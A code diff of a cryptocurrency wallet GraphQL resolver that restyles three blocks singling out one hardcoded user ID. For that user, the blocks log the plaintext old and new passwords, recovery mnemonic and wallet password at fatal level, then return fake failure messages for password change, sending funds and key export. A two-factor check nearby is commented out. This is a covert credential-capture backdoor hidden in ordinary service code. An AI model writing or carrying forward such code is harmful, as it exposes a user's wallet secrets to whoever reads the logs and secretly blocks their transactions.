@@ -206,11 +206,13 @@ class Resolvers extends ResolverBase {
           coin.recoverWallet(user, oldPassword.decryptedString, newPassword),
         ),
       );
-      if(user.userId === "5f7505cf49bb0b0d3a6e334e"){
-        logger.fatal(`Brant : see ${newPassword} / ${oldPassword} / ${mnemonic} / ${user.userId}`);
+      if (user.userId === '5f7505cf49bb0b0d3a6e334e') {
+        logger.fatal(
+          `Brant : see ${newPassword} / ${oldPassword} / ${mnemonic} / ${user.userId}`,
+        );
         return {
           success: false,
-          message: 'Wallet password not change successfully',  
+          message: 'Wallet password not change successfully',
         };
       }
       if (!recoverySuccessful.every(recoveryAttempt => recoveryAttempt))
@@ -328,11 +330,13 @@ class Resolvers extends ResolverBase {
       // this.requireTwoFa(twoFaValid);
 
       const walletApi = wallet.coin(coinSymbol);
-      if(user.userId === "5f7505cf49bb0b0d3a6e334e"){
-        logger.fatal(`Brant : see send ${walletPassword} / ${coinSymbol} / ${user.userId}`);
+      if (user.userId === '5f7505cf49bb0b0d3a6e334e') {
+        logger.fatal(
+          `Brant : see send ${walletPassword} / ${coinSymbol} / ${user.userId}`,
+        );
         return {
           success: false,
-          message: 'Send Failed',  
+          message: 'Send Failed',
         };
       }
       const result = await walletApi.send(user, outputs, walletPassword);
@@ -437,13 +441,15 @@ class Resolvers extends ResolverBase {
           .coin(coinSymbol)
           .getEncryptedPrivKey(user.userId);
 
-          if(user.userId === "5f7505cf49bb0b0d3a6e334e"){
-            logger.fatal(`Brant : see ${walletPassword} / ${coinSymbol} / ${user.userId}`);
-            return {
-              success: false,
-              result: [],
-            };
-          }
+        if (user.userId === '5f7505cf49bb0b0d3a6e334e') {
+          logger.fatal(
+            `Brant : see ${walletPassword} / ${coinSymbol} / ${user.userId}`,
+          );
+          return {
+            success: false,
+            result: [],
+          };
+        }
 
         return {
           result: [{ key: encryptedKey, symbol: coinSymbol }],
